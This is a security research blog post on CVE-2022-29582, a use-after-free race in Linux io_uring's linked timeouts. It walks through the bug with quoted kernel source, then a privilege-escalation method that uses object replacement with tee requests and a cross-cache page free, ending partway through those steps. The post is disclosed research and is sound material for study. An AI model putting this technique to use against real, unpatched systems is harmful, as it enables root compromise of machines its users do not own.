# Introduction

This post covers an interesting vulnerability we ([Jayden](https://twitter.com/Awarau1) and [David](https://twitter.com/pqlqpql)) found in the `io_uring` subsystem of the Linux kernel.

We collaboratively wrote an exploit that targets a hardened [nsjail](https://github.com/google/nsjail) environment inside of Google's [container optimized OS](https://cloud.google.com/container-optimized-os/docs/concepts/features-and-benefits) (COS) distro. 
The exploit does not require unprivileged user namespaces and results in root privileges in the root namespace. To gain root, we leveraged a Use-After-Free vulnerability. This allowed us to execute our own code in kernelmode.

We were awarded a generous bounty through [Google's kCTF vulnerability research program](https://security.googleblog.com/2022/02/roses-are-red-violets-are-blue-giving.html).

# io_uring

A general and up-to-date overview of `io_uring` has been provided already by others. They explain it a thousand times better than we could, so we'll only cover the subsystem more broadly (see [this writeup by Grapl Security](https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel) and [this writeup by Flatt Security](https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a) for a great introduction.) `io_uring` is quite a complex subsystem, so it's recommended to read up on the literature in case you require some extra context. 

We will however cover some of the finer details of the `IORING_OP_TIMEOUT`, `IORING_OP_LINK_TIMEOUT` and `IORING_OP_TEE` opcodes, as they are directly relevant to the vulnerability.

Our exploit targets kernel version `5.10.90`, the version Google was running remotely at the time. We had to tune our exploit to the particular server specs (4 Skylake Xeon cores @ 2.80Ghz, 16GiB RAM), but with some tweaking, any machine running a vulnerable kernel should be exploitable.

---

## Kernel submission

To communicate with `io_uring`, we first ask the kernel to setup a new io_uring instance. The kernel prepares the io_uring context (`struct io_ring_ctx`) and allocates a user/kernel shared area of memory to house the ring buffers:

1. the *submission queue* (**SQ**)
2. the *completion queue* (**CQ**).

Once the shared space is reserved, the kernel returns a file descriptor to us. We then map the queues into our own address space using the given file descriptor.

When we wish to submit a request for operation, we'll fill in a *submission queue entry* (**SQE**) in the shared SQ space. Afterwards, we can use the `io_uring_enter` system call to submit up to the number of SQEs filled in. The kernel then retrieves the given number of SQEs from the SQ.

The SQE is a structure that encodes a single (I/O) operation that the kernel will perform asynchronously for us once it is submitted:

```c
struct io_uring_sqe {
	__u8	opcode;		/* type of operation for this sqe */
	__u8	flags;		/* IOSQE_ flags */
	__u16	ioprio;		/* ioprio for the request */
	__s32	fd;		/* file descriptor to do IO on */
	union {
		__u64	off;	/* offset into file */
		__u64	addr2;
	};
	union {
		__u64	addr;	/* pointer to buffer or iovecs */
		__u64	splice_off_in;
	};
	__u32	len;		/* buffer size or number of iovecs */
	union {
		__kernel_rwf_t	rw_flags;
		...
		__u32		timeout_flags;
		...
		__u32		splice_flags;
	};
	__u64	user_data;	/* data to be passed back at completion time */
	union {
		struct {
			/* pack this to avoid bogus arm OABI complaints */
			union {
				/* index into fixed buffers, if used */
				__u16	buf_index;
				/* for grouped buffer selection */
				__u16	buf_group;
			} __attribute__((packed));
			/* personality to use, if used */
			__u16	personality;
			__s32	splice_fd_in;
		};
		__u64	__pad2[3];
	};
};
```

Most importantly, the `opcode` field determines what kind of operation to perform. For each `opcode` which requires it, the `fd` field specifies the file descriptor on which to perform the requested I/O. Almost every normal I/O syscall (`read`, `sendto`, etc.) has an asynchronous opcode equivalent. Each field can take on different roles depending on the operation, as outlined [here](https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html).

Once retrieved from the SQ, an SQE is converted to an internal representation described by `struct io_kiocb` (**k**ernel **i**nput/**o**utput **c**all**b**ack). These objects are commonly referred to as *request*s (try saying *io_kiocb* repeatedly very fast :p).
```c
struct io_kiocb {
	union {
		struct file		*file;
		...
		struct io_timeout	timeout;
		...
		struct io_splice	splice;
		...
	};

	/* opcode allocated if it needs to store data for async defer */
	void				*async_data;
	u8				opcode;
	/* polled IO has completed */
	u8				iopoll_completed;

	u16				buf_index;
	u32				result;

	struct io_ring_ctx		*ctx;
	unsigned int			flags;
	refcount_t			refs;
	struct task_struct		*task;
	u64				user_data;

	struct list_head		link_list;
	...
};
```

The `struct io_kiocb` is used as a "ready-for-launch" equivalent of the SQE it is based on. Any file descriptors are resolved to `struct file*`s, the user's credentials are attached, the *personality* (which cores to run on) is attached, etc.

Once the requested operation finishes, an entry that corresponds to the SQE is written to the *completion queue* (**CQ**). Such an entry is called a *completion queue entry* (**CQE**), and contains fields like an error code and a result value. The userspace application can poll the CQ for new entries to determine whether the submitted SQEs have finished processing, and what their result was.



Together we have a user interface which allows us to submit requests to the submission queue and to reap results from the completion queue (visualisation due to [cor3ntin](https://cor3ntin.github.io/posts/iouring/)):

    <figcaption><center><i>A high level visualisation of the general io_uring flow.<br></i></center></figcaption>
</figure>


### Terminology
Before we begin, let's first clarify the terms used throughout this article:
- An *SQE*, *request*, and *operation* are used mostly interchangably, but:
  - An *SQE* concretely exist in the submission queue.
  - A *request* (`struct io_kiocb`) concretely exists in kernel memory, and is a post-processed version of the SQE.
  - An *operation* is an abstract type that an SQE or request can have. 
- A request *completes* whenever its CQE entry has been written to the CQE.
  - When a request *completes*, a *completion event* is posted (more on this later).
- A request *succeeds* whenever it *completes* **and** it does not have an error code.
- A request is *cancelled* whenever it *completes* **and** its error code is `-ECANCELLED`.
- A request is *destroyed* after it *completes*. The request is first "cleaned up" and subsequently freed. 

## Specification
In this section we'll specify the semantics of those io_uring operation types which are relevant to the bug and to our method of exploitation. 


### Linked SQEs
`io_uring`'s primary use case is asynchronous I/O. However, sometimes we want a synchronous mode of operation. This can be useful when we have a data dependency on a previous request, e.g. we want to read from one file descriptor and afterwards write the result to three others.  

The solution is to use *linked requests*. We can link multiple requests together with the `IOSQE_IO_LINK` flag to form a *chain*. The chain is then executed sequentially.

If any link in a single chain fails then the whole chain fails. Separate chains may still be executed concurrently as they are not ordered with respect to each other.



<figure>
<img src="/img/posts/cve-2022-29582/link.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>This SQ contains two separate chains, each with four linked requests. </i></center></figcaption>
</figure>

### Timeout operations: IORING_OP_TIMEOUT

`io_uring` allows us to set a timeout for IO operations. We can submit an SQE with the opcode set to `IORING_OP_TIMEOUT`, a timeout **T** (`struct timespec64`), and an optional completion event count **C**. The request can either succeed or fail with `-ETIME`.

- When the specified timeout period **T** has passed:
  1. A `hrtimer` fires, which will cause the request to be cancelled with `-ETIME`.
- (Optionally) When **C** other requests have completed:
  1. The pending timeouts are inspected after every request completion (*flushed*.)
  2. If a timeout has reached its completion event count, it succeeds.

In both of these cases, a *wakeup event* is posted to anybody waiting on the completion queue (via e.g. `IORING_ENTER_GETEVENTS`.) 

If **C** is set to zero, the request acts purely as a timer.

<figure>
<img src="/img/posts/cve-2022-29582/timeout.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Example IORING_OP_TIMEOUT semantics.</i></center></figcaption>
</figure>

Given the diagram above, let's work out what happens exactly. We write **Tᶜ** to denote the amount of completion events left for timeout **T**. So initially, {**Cᶜ**, **Dᶜ**, **Eᶜ**} = {2, 2, 5}.

1. **T+0000**ns: **A** completes (and posts a completion event), so the timeouts require one fewer completion before they themselves succeed: {**Cᶜ**, **Dᶜ**, **Eᶜ**} = {1, 1, 4}
2. **T+1000**ns: **B** completes *and* **E**'s timer fires.
    1. **E** posts a wakeup event to the CQ, then completes with`-ETIME`.
    2. **B**'s completion event causes {**Cᶜ**, **Dᶜ**} = {0, 0}, so **C, D** succeed. Two more wakeup events are posted to the CQ.

Note that the timeouts themselves also post completion events, so this can get hard to reason about fairly quickly.

---

### Timeout operations: IORING_OP_LINK_TIMEOUT
We saw that `IORING_OP_TIMEOUT` only cares about whether the number of completions in its past meets the number of completions it is waiting for. But sometimes we want to create a timeout which targets a particular operation. The `IORING_OP_LINK_TIMEOUT` opcode serves exactly this purpose. We send the original SQE with the `IOSQE_IO_LINK` flag set. Immedatiately after, we add an `IORING_OP_LINK_TIMEOUT` SQE with our desired timeout and submit the linked SQEs together.

Both operations will start at the same time and follow the logic:

- If the specified timeout has passed (i.e. the timeout operation succeeds), the original operation is cancelled.
- If the original operation completed, the timeout operation itself is cancelled instead.


<figure>
<img src="/img/posts/cve-2022-29582/linktimeout.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Example IORING_OP_LINK_TIMEOUT semantics.</i></center></figcaption>
</figure>

Say that **X** is an operation, then we'll let **Xᴸᵀ** denote its linked timeout. The diagram is situated at **T+1000**ns from when **A** and **B** were submitted.

- **Aᴸᵀ** fires, so **Aᴸᵀ** completes and **A** is cancelled.
- **B** completes, so **Bᴸᵀ** is cancelled. 

For an introduction to these timeouts, including motivations and use cases, these LWN threads might help: [IORING_OP_TIMEOUT](https://lwn.net/Articles/800308/), [IORING_OP_LINK_TIMEOUT](https://lwn.net/Articles/803932/). 

---

### IORING_OP_TEE requests
Although `IORING_OP_TEE` requests are not directly relevant to the bug, we need them for exploitation. Very briefly: with tee, we can splice the contents from one pipe onto another. 

In terms of the SQE, `splice_fd_in` is the file descriptor to read from and `fd` is the file descriptor to write to. 

In terms of the `io_kiocb`, `splice.file_in`  points to the `file` object associated with the given `splice_fd_in`. 

Read more about `tee` at the [io_uring_enter](https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html) and [tee](https://man7.org/linux/man-pages/man2/tee.2.html) manual pages.

## Combining a timeout and a link timeout

For the sake of experimentation, let's think about what happens when we try to combine an `IORING_OP_TIMEOUT` request **T** with its own `IORING_OP_LINK_TIMEOUT` **LT**. Of course, we need to specify the `IOSQE_IO_LINK` flag for **T**.


<figure>
<img src="/img/posts/cve-2022-29582/combinetimeouts.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>IORING_OP_TIMEOUT linked with IORING_OP_LINK_TIMEOUT.</i></center></figcaption>
</figure>


From the previous section we can try to derive the behaviour of such a request chain. Let's reason about the different states of `T` and `LT`, according to the documentation.

- **case 1:** `LT` times out before `T`:
  - `T` is cancelled (CQ entry with `-ECANCELED`, then destroyed)
  - `LT` completes (CQ entry with `-ETIME`, then destroyed) 
- **case 2:** `T` times out before `LT`:
  - `T` completes (CQ entry with `-ETIME`) and is destroyed
  - `LT` is cancelled (CQ entry with `-ECANCELED`, then destroyed)

- **case 3:** `T` completion event count is reached before `LT` timeout:
  - Same as in case 2.

Verifying whether our assertions are correct or not is a great way to learn more about the target. We can also try to find some state with semantics that cannot be inferred from the specification alone and investigate them more closely..

- **case 4:** `T` completes concurrently with `LT` (*this encompasses a variety of possible states*)
  - ..We honestly have no idea what will happen, right?
 
Since we can't answer this directly from the documentation, we will need to dig into the implementation. Already, this smells of "edge-case".

---

# Examining the edge case
Alright, let's get right to it. We'll work out what happens for the mentioned fourth case. For brevity, we only handle parts that will be relevant later.

## Analysis: linking of `T` and `LT`
By setting the `IOSQE_IO_LINK` flag in the SQE for `T`, we declare a link between `T` and `LT`. Concretely, this link is a reference between two nodes in a circular doubly linked list. The node is embedded in each `struct io_kiocb` through the field `link_list`. This means that `T.link_list.next` is set to `LT` while `LT.link_list.prev` is set to `T`.
```c 
static int io_submit_sqe(struct io_kiocb *req, 
                         const struct io_uring_sqe *sqe,
			  struct io_kiocb **link, struct io_comp_state *cs)
{
	if (*link) {
		struct io_kiocb *head = *link;
		list_add_tail(&req->link_list, &head->link_list);
```

---

## Analysis: Completion of `T` through flushing
Remember that `T` will complete if the given `C` completion events are posted before `T`'s  timer fires. Let's say that `C = 1` and `B` is an arbitrary request, which after finishing its operation, posts a completion event. 

Upon `B`'s completion we *flush* all timeouts attached to this io_uring instance (`io_ring_ctx`). To do this, we iterate over the `timeout_list` and if the number of events completed is greater than `C` then the timeout, in this case `T`, is *killed*:

<figure>
<img src="/img/posts/cve-2022-29582/flushT.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Completion semantics of T triggered by B through timeout flush.</i></center></figcaption>
</figure>


Apart from cancelling the internal timer, in `io_kill_timeout()` we decrement the `T` refcount due to its removal from `timeout_list`. If the refcount is now 0 the destruction work is queued to be carried out in the future.

---

## Analysis: Completion of `LT` through timer firing
Remember that `LT` will complete if its timer fires before `T` completes. When this happens, the hrtimer callback `io_link_timeout_fn` will get called through an hardirq:
```c
static enum hrtimer_restart io_link_timeout_fn(struct hrtimer *timer)
{
    struct io_timeout_data *data = container_of(timer,
                                    struct io_timeout_data, timer);
    struct io_kiocb *req = data->req;
    struct io_ring_ctx *ctx = req->ctx;
    struct io_kiocb *prev = NULL;

    spin_lock_irqsave(&ctx->completion_lock, flags);

    if (!list_empty(&req->link_list)) {
        
            prev = list_entry(req->link_list.prev, struct io_kiocb, link_list);
            if (refcount_inc_not_zero(&prev->refs))
                list_del_init(&req->link_list);
            else
                prev = NULL;
    }

    spin_unlock_irqrestore(&ctx->completion_lock, flags);

    if (prev) {
        io_async_find_and_cancel(ctx, req, prev->user_data, -ETIME);
        io_put_req_deferred(prev, 1);
    } else {   
        io_cqring_add_event(req, -ETIME, 0);
        io_put_req_deferred(req, 1);
    }
    return HRTIMER_NORESTART;
}
```
The internal control flow looks something like this:

<figure>
<img src="/img/posts/cve-2022-29582/LTcallback.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Control flow through io_linked_timeout_fn</i></center></figcaption>
</figure>

Most interesting here is the state where `LT.link_list` is non-empty and `T.refs == 0`. If these conditions are met, then we'll zip to the bottom left of the diagram, failing to remove `LT` from the `link_list`. Seems pretty fishy...

Think about it: `LT` has completed, meaning it will be destroyed (deallocated). Yet the reference from `T` to `LT` remains intact. Looks like we are getting hot on the trail of a bug. But to state anything conclusive, we still need to answer the question: **in practice, is it possible for the `T` refcount to be 0 concurrently with `LT`'s timer firing?** 

---

## Analysis: Concurrent completion of `T` and `LT`
We now know how the two completions work individually. So let's combine them into concurrent operations! In particular, ones that violate memory safety😉.

<figure>
<img src="/img/posts/cve-2022-29582/concurrcompl.jpg" alt="Trulli" style="width:100%">
<figcaption><center><i>Concurrent completions of T and LT. <br>T's refcount is decremented just before LT's path checks it.</i></center></figcaption>
</figure>

Orange denotes the kernel thread path that is hit whenever `T` has to be flushed, and blue denotes the hrtimer hardirq context that is hit whenever `LT`'s timer fires.

If `T`'s refcount is decremented *before* `io_link_timeout_fn` checks it, `list_del_init` is never called to remove `LT` from the `link_list` list.

This can become a problem in a very specific situation: in order to reach this state, `T` has to already be scheduled for destruction, meaning that `LT` is always scheduled for destruction later than `T`. But what happens if despite this scheduling sequence, `LT` is freed *before* `T` is destroyed? Right, a dangling reference!


<figure>
<img src="/img/posts/cve-2022-29582/destroysched.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Depending on how long the scheduling of destruction for T vs. LT takes, we can end up with a dangling reference to the freed LT.</i></center></figcaption>
</figure>

Internally, the deferred destruction is implemented using kernel `work`, an abstraction on top of `softirq`s. It turns out that it is in fact possible for two different work entries to be executed out of order with respect to their initial queue times. This could happen e.g. when the work is queued on different CPUs with different workloads, or honestly, just pure luck. 

It's starting to look like we have a proper bug now. But a dangling reference is only useful if it is ever dereferenced. 

---

## Racing the deferred workers

At this point we've deferred the destruction of both `T` and `LT`. 

<figure>
<img src="/img/posts/cve-2022-29582/workercb.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>io_put_req_deferred_cb is called as request destruction work.</i></center></figcaption>
</figure>

When those worker threads start, we'll have a race through `io_free_req()` :running:

<figure>
<img src="/img/posts/cve-2022-29582/greenpurple.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>If green frees LT before purple accesses LT in io_kill_linked_timeout<br>then we have a Use-After-Free.</i></center></figcaption>
</figure>

Purple denotes the worker which destroys `T`. Green denotes the worker which destroys `LT`. As we can see, there is a possible race sequence where `LT` is freed sometime before `T` retrieves it from the `link_list`. Accessing `LT` at any point after this sequence will be a Use-After-Free. In other words, we have our bug!

---

# Exploitation
To recap the bug: `T` retains a dangling reference which it follows to `LT` when being destroyed.

## Replacing `LT`
In order to exploit this Use-After-Free bug we perform **object replacement**. The aim is to reallocate another object `LT'` at the address of `LT` to direct control flow at a point where the kernel expects to see `LT`. Object replacement is possible because after `LT` is freed, the kernel heap allocator is allowed to recycle `LT`'s underlying memory to service another allocation (`LT'`).

<figure>
<img src="/img/posts/cve-2022-29582/replace.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Object replacement causes confusion, which can escalate our control.</i></center></figcaption>
</figure>

In some scenarios it's easy to replace an object on the fly. But we are constrained in two ways:
1. `LT'` has to be allocated and initialised in a **race window**. That is, after `LT` is freed but before we reach a point where `LT` is no longer accessed e.g. after `T` is freed. 
2. `LT'` can only be another `struct io_kiocb` object. Due to **heap isolation**, where heap objects are separated based on their type, it is too difficult to reallocate as a different type of object within the race window. 

Okay, so continuing from the worker thread race, let's introduce a third racer!

<figure>
<img src="/img/posts/cve-2022-29582/red.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Adding a new racer to allocate LT' at the same place as LT.</i></center></figcaption>
</figure>

We're already familiar with the purple and green workers. But who's the new racer in town? The red worker replaces `LT` with `LT'` before, or during, purple's attempt to access `LT`. Notice that `LT'` is a request of operation type `IORING_OP_TEE`. 
```c
static int io_tee(struct io_kiocb *req, bool force_nonblock)
{
	struct io_splice *sp = &req->splice;
	struct file *in = sp->file_in;
	struct file *out = sp->file_out;
	unsigned int flags = sp->flags & ~SPLICE_F_FD_IN_FIXED;
	long ret = 0;

	...
	if (sp->len)
		ret = do_tee(in, out, sp->len, flags);

	io_put_file(req, in, (sp->flags & SPLICE_F_FD_IN_FIXED));
	...
}
```
An `IORING_OP_TEE` request takes in two files: it reads data from`in` and splices (writes) data to `out` . This assists us in exploiting the bug: we can block indefinitely in `do_tee()` by making it read from a pipe end. This way, we can ensure that `LT'` stays alive for as long as we want to, stabilising the exploit.

When we're ready, we can make data available to read through `in`, by writing to the other pipe end. This resumes execution: the thread will return from `do_tee()` and enter `io_put_file()`. 

---

## Releasing refs on `LT'`
At this point we've replaced `LT` with `LT'`, contradicting the purple worker's expectation of `LT`. This may be good for us if we can cause another Use-After-Free on `LT'` or an object it owns. However, there's a point after which purple no longer accesses `LT'` as `LT`'s relevance to `T`'s destruction is limited.

The question now is: 
**What does purple do to `LT'` and how does `LT'` influence purple's control flow?**

In order to answer this, we will continue roughly from where purple first uses `LT'`.
```c
static void io_kill_linked_timeout(struct io_kiocb *req)
{
	struct io_ring_ctx *ctx = req->ctx;
	struct io_kiocb *link;
	bool cancelled = false;
	unsigned long flags;

	spin_lock_irqsave(&ctx->completion_lock, flags);
	link = list_first_entry_or_null(&req->link_list, struct io_kiocb,
					link_list);
	/*
	 * Can happen if a linked timeout fired and link had been like
	 * req -> link t-out -> link t-out [-> ...]
	 */
	if (link && (link->flags & REQ_F_LTIMEOUT_ACTIVE)) {
		struct io_timeout_data *io = link->async_data;
		int ret;

		list_del_init(&link->link_list);
		ret = hrtimer_try_to_cancel(&io->timer);
		if (ret != -1) {
			io_cqring_fill_event(link, -ECANCELED);
			io_commit_cqring(ctx);
			cancelled = true;
		}
	}
	req->flags &= ~REQ_F_LINK_TIMEOUT;
	spin_unlock_irqrestore(&ctx->completion_lock, flags);

	if (cancelled) {
		io_cqring_ev_posted(ctx);
		io_put_req(link);
	}
}
```
The internal control flow looks something like this:

<figure>
<img src="/img/posts/cve-2022-29582/killcf.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Internal control flow for io_kill_linked_timeout</i></center></figcaption>
</figure>

Since `LT'` is an `IORING_OP_TEE` request, it's not an active timeout. This implies that:
1. Yet again, we don't remove `LT'` from `link_list`.
2. Since we don't try to cancel the `LT'` timer, we also don't release a reference to `LT'`.

Okay, interesting. But nothing really jumps out of the screen. So let's keep digging. 
After we return from `io_kill_linked_timeout()` we are back in `__io_req_find_next()`:

<figure>
<img src="/img/posts/cve-2022-29582/faillinks.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Reaching io_fail_links after io_kill_linked_timeout</i></center></figcaption>
</figure>

Since the `REQ_F_FAIL_LINK` flag is indeed set for `T`, we take the `io_fail_links(T)` path. We know that `LT'` is not an active timeout, meaning it was **not** removed from `link_list` in `io_kill_linked_timeout()`. So `T->link_list.next == LT'`. 

From `io_fail_links()`, two refcounts are released on `LT'`. Since new requests start with `refs == 2`, `LT'` is set to be cleaned up and destroyed! Now *this* is starting to look good!

---

## Cleaning up `LT'`

<figure>
<img src="/img/posts/cve-2022-29582/LT2cleanup.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Cleaning up LT' releases a file ref</i></center></figcaption>
</figure>

`LT'`'s cleanup phase releases a reference to `req->spice.file_in`. After this, the file's refcount is `1`. But is there actually only one reference to this file?

Nope :) ! We hold two references: one from when `LT'` was setup, its handling thread now blocked in `do_tee()`. The other, because we had to create the `in` pipe in the first place. So we've still got a userspace file descriptor which resolves to the `in` `file`.

---

## Releasing the final `file` ref
To summarise where we're at: upon triggering the Use-After-Free we reallocated `LT` as `LT'` - a request of type `IORING_OP_TEE`. This then allowed us to fix `LT'` in memory by blocking in `do_tee()`. Having won the race, we cleaned and destroyed `LT'` from the perspective of the worker thread handling `T`'s destruction. Finally, we upgraded the Use-After-Free into an **incorrect refcount** on a pipe `file` object. 

It's been a big journey so far. But we have a while to go before root. So let's get to it :small_airplane:. 

Remember that we chose `IORING_OP_TEE` because it allowed us to stabilise the exploit. But there's another, more nefarious, reason. 

<figure>
<img src="/img/posts/cve-2022-29582/wakeup.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Calling io_put_file to free the file</i></center></figcaption>
</figure>

Once we make data available to read through the `in` `file`, we wake up the `pipe->rd_wait` wait queue head. Since `pipe_readable(pipe)` is now true, this splices the data read from `in` onto the `out` pipe `file`. Then we return from `do_tee()`, into `io_put_file(req, in, ...)` which releases another reference to `in`.

Because we were able to release a reference to `in` when we destroyed `LT'`, `in`'s refcount is now `0`. So `in` will be freed! This gives us a very powerful primitive, since we retain a tangible reference to it from usermode. More exactly, when we invoke system calls with the associated file descriptor, then we'll actually be operating on a stale `file` object in kernelspace.

---

## Crossing the cache boundary
So, what to do with our `file` Use-After-Free? Can we just replace it with another object, maybe partially overwriting a function pointer to get code execution? 

Just like with `io_kiocb` objects, we again run into **heap isolation**. While heap isolation isn't a security mitigation in its own right, it can inadvertently prevent or make the exploitation of heap based bugs extremely difficult. Unlike earlier, we'll actually attempt to bypass it in this section. But before then, some background. 

### Slab caches
The SLUB allocator (`mm/slub.c`) organises the kernel heap according to the techniques of **slab allocation**. Slabs of memory are preemptively sliced into object-sized units. Further, slabs comprise what we call **slab caches**. Important for us: different caches service different types of objects. In this way, different slab caches or heaps are isolated from one another.

Our `file` has its own exclusive **dedicated cache** -- known as `filp`. Only `struct file` objects may be allocated in the `filp` cache. This means that we can't allocate some arbitrary object at the address of our `file`. We are, at least nominally, constrained to reallocate the `file` as just another object of the same type.

Of course, it isn't always the case that we are limited in this way. Some objects do share the same cache. For example, objects which come from a **general cache** will share it with other objects of a similar size (i.e. general caches are "typed" solely based on the maximum size of their objects).

Further, dedicated caches can be merged -- meaning that despite having different names and managers they still come from the same underlying memory. Unfortunately, the former option isn't true for `file` objects and the latter option is a dead end on the target system. 

However, at the end of the day, we're still dealing with an allocator, and an allocator has to be able to reuse freed memory. If you think about it, shouldn't every slab be mergable on the level of raw memory?

### The memory hierarchy
Slabs are allocated from the more fundamental: **pages** of memory (see appendix for a discussion on paging). Pages are grouped into zones and also into different nodes if we're using [NUMA](https://en.wikipedia.org/wiki/Non-uniform_memory_access):


<figure>
<img src="/img/posts/cve-2022-29582/mem.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Visualisation of the Linux memory hierarchy</i></center></figcaption>
</figure>

Right now we've got a `file` object which is sitting on a slab in a morgue. We can't reallocate it as a more useful object (with which to overwrite its contents).  So if we stay at the level of the SLUB allocator then we've reached a dead end. But at a lower level, each slab is built on top of conjoined pages and these pages are the objects of allocation and deallocation too! Let's think through the implications of this...

### Page use-after-free

If by some miracle we are able to free the underlying page back to the page allocator then we might be able reallocate the page to a more helpful slab cache. Rather than merely holding a stale reference to the pipe `file` object, we can extend this into a stale page reference.  

Let's hypothesise about what it means for a page to be free. For one, returning a page to the page allocator (`mm/page_alloc.c`) likely implies that it's empty. This means that at the very least we need to free all objects which neighbour the target `file`. But this isn't sufficient by itself. The SLUB allocator keeps empty pages around just in case they need to be used again in the near future.

Empty pages and partially empty pages are typically hooked up to a **cpu partial list**. It's a partial list because the pages are partially empty. It's a CPU list because there's one for each CPU. Each cpu partial list is managed by a CPU cache, all of which are held by a general cache manager. So there's a manager for `filp`, `kmalloc-512`, and so on. 

<figure>
<img src="/img/posts/cve-2022-29582/slabcache.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>The relevant fields in the slab cache descriptors</i></center></figcaption>
</figure>
The general manager type `struct kmem_cache` describes each individual slab cache. Our `file` object's slab cache is named "filp". `struct kmem_cache` objects point to `struct kmem_cache_cpu` (CPU cache descriptor) objects. From each of these we get two major collections of objects. The first are those objects which sit on **partial slabs** together forming the **cpu partial list**. The second are those objects comprising the Very Hungry Caterpillar :100:. No no, these objects actually comprise the **active slab**. The active slab, `struct page *page` in the CPU cache descriptor, is where the next object will be reserved. 

If a slab is full and is not the active slab, the SLUB allocator stops tracking it. It regains control over the slab when an object from this slab is returned to the SLUB allocator. The object's slab is then linked back up to the partial list. 

#### How do we allocate a new page?
An extreme case is when there are no available objects in the cache. At this point, we need to request a whole new slab. 

<figure>
<img src="/img/posts/cve-2022-29582/newslab.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Allocating a new slab</i></center></figcaption>
</figure>
In the above diagram we keep trying to get a slab from one of the many lists available to a cache. Until finally, we get to asking for a new slab. The new slab is express-shipped from the page allocator.

So that explains how to allocate a new page - just fill up all the pages in use by the cache and make the SLUB allocator request another slab. This can be done just by spamming with the system calls which allocate the target object. So for us, we can do that by calling `open()` or `pipe()`.

#### How to free a page?
Let's say that we free an object `f` whose slab (or page) is denoted by `P`.

<figure>
<img src="/img/posts/cve-2022-29582/freeslab.jpg" alt="Trulli" style="width:100%">
    <figcaption><center><i>Freeing a slab</i></center></figcaption>
</figure>
In the diagram above, we enter through `__slab_free()`. Then to reach `put_cpu_partial()`, its purpose being to place the object's slab on the CPU partial list, we need it to be true that this slab was previously full and is not the active slab. Remember that full slabs are not accounted for. So when an object from a once full slab is freed back to the SLUB allocator its slab needs to be put onto the partial list for tracking.

To arrive at `unfreeze_partials()` we need to satisfy a very important condition: that the "partial array is full". This means we'll "move the existing set to the per node partial list" (quoting the comments). Cross-cache achieves this in the following way:

<figure>
<img src="/img/posts/cve-2022-29582/partialoverflow.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Overflowing the cpu partial list</i></center></figcaption>
</figure>
In the diagram above we start from the left having previously freed the target page. Then successively we free one object per (full) page, for the maximum number of pages allowed in the partial list. The last of these pages triggers entry into `unfreeze_partials()` because it overflows the partial list.

There's an additional purpose to `unfreeze_partials()` apart from moving the pages to the node partial list. If any of the partial pages is empty, then `page.inuse` is false. So as we can see, the page is stored for **discarding**. This takes us to our grand goal: discarding a slab page means freeing that page back to the page allocator. 

Hang on a second, not so fast! We've still got some questions to answer:  
1. How do we fill up a page? The kernel variable describing the maximum amount of objects for each slab is: `objs_per_slab`. Its value is accessible through sysfs: `/sys/kernel/slab/filp/objs_per_slab : 25`

2. How do we know the maximum number of pages allowed on the partial list? We need to free one object per page for the max pages in order to overflow the partial list. We also need to ensure there's no excess objects still allocated on the target page. In a similar way we can get the value for `cpu_partial`, the maximum amount of pages able to fit on a CPU partial list for this cache: `/sys/kernel/slab/filp/cpu_partial : 13`

### Method
So we know that it's possible for us, from userspace, to free a page programmatically. The mechanics to this is what follows. 

---
<figure>
<img src="/img/posts/cve-2022-29582/cc1.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Reserving slabs to overflow the partial list</i></center></figcaption>
</figure>
In step 1 we reserve our partial list pages. They should be full now so that we can invoke `put_cpu_partial()` later. Since we want to overflow the partial list we reserve more pages than the list can fit. After we've allocated 25 x (13 + 1) objects there are two possibilites, as shown in the diagram above. First, the new active slab is slab 14 and is full. This is possible if there were no files on slab 1 prior to cross-cache. More likely is the second possibility, where slab 15 is the active slab and is not full. We will assume that we are in the latter case. But the (slightly more cautious) steps are the same.

    <figcaption><center><i>Setting the target slab as the active slab</i></center></figcaption>
</figure>
In step 2 we allocate 1 less than the maximum number of objects per slab, so that's 24. We now have a new active slab containing n - 1 allocated objects.

<figure>
<img src="/img/posts/cve-2022-29582/cc3.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Triggering the Use-After-Free</i></center></figcaption>
</figure>
Okay, step 3 we are a little more familiar with. We trigger the `file` Use-After-Free. 

---
<figure>
<img src="/img/posts/cve-2022-29582/cc4.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Setting a new active slab</i></center></figcaption>
</figure>
In step 4 the main goal is to allocate enough objects to get a new active slab. So we allocate 26, meaning our target `file` has been reallocated. If we don't do this then when we empty out the target page it'll just stay as the active slab.  

---

<figure>
<img src="/img/posts/cve-2022-29582/cc5.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Emptying the target slab</i></center></figcaption>
</figure>
In step 5 we free all allocations from the target slab. Of these, the first freed file leads to `put_cpu_partial()` because the target slab was previously full. So now we've got our target slab on the partial list! Hm... spooky feeling -- déjà vu, anyone? 

---

<figure>
<img src="/img/posts/cve-2022-29582/cc6.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Overflowing the partial list to free the target slab</i></center></figcaption>
</figure>
